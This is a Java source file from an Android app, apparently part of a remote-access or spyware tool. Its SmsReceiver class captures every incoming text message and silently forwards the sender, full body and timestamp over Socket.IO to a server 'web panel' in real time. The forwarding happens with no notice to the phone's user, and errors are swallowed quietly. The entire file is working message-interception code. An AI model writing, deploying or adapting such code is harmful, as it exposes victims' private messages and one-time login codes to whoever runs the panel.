package com.fason.app.receiver;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsMessage;

import com.fason.app.core.Protocol;
import com.fason.app.core.network.SocketClient;
import com.fason.app.core.permissions.PermissionManager;

import org.json.JSONObject;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * Listens for incoming SMS messages and immediately pushes them
 * to the server via Socket.IO so the web panel can display them
 * in real-time without manual fetch.
 */
public class SmsReceiver extends BroadcastReceiver {

    private static final String SMS_RECEIVED_ACTION = "android.provider.Telephony.SMS_RECEIVED";
    private static final ExecutorService EXEC = Executors.newSingleThreadExecutor();

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent == null || !SMS_RECEIVED_ACTION.equals(intent.getAction())) {
            return;
        }

        if (!PermissionManager.canIUse(Manifest.permission.RECEIVE_SMS)) {
            return;
        }

        // Use goAsync() to avoid ANR — gives us up to 10 seconds
        final PendingResult pendingResult = goAsync();

        EXEC.execute(() -> {
            try {
                Bundle bundle = intent.getExtras();
                if (bundle == null) {
                    pendingResult.finish();
                    return;
                }

                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus == null || pdus.length == 0) {
                    pendingResult.finish();
                    return;
                }

                String format = bundle.getString("format", "3gpp");

                // Reconstruct the full message (multi-part SMS support)
                StringBuilder bodyBuilder = new StringBuilder();
                String sender = null;
                long timestamp = System.currentTimeMillis();

                for (Object pdu : pdus) {
                    SmsMessage smsMessage;
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        smsMessage = SmsMessage.createFromPdu((byte[]) pdu, format);
                    } else {
                        smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                    }

                    if (smsMessage != null) {
                        if (sender == null) {
                            sender = smsMessage.getDisplayOriginatingAddress();
                            timestamp = smsMessage.getTimestampMillis();
                        }
                        bodyBuilder.append(smsMessage.getDisplayMessageBody());
                    }
                }

                if (sender == null || bodyBuilder.length() == 0) {
                    pendingResult.finish();
                    return;
                }

                // Build JSON and emit to server
                JSONObject data = new JSONObject();
                data.put(Protocol.KEY_TYPE, "new_sms");
                data.put(Protocol.KEY_ADDRESS, sender);
                data.put(Protocol.KEY_BODY, bodyBuilder.toString());
                data.put(Protocol.KEY_DATE, String.valueOf(timestamp));
                data.put(Protocol.KEY_READ, "0");
                data.put("smsType", "1"); // 1 = received

                io.socket.client.Socket socket = SocketClient.getInstance().getSocket();
                if (socket != null) {
                    socket.emit(Protocol.SMS, data);
                }
            } catch (Exception ignored) {
            } finally {
                pendingResult.finish();
            }
        });
    }
}
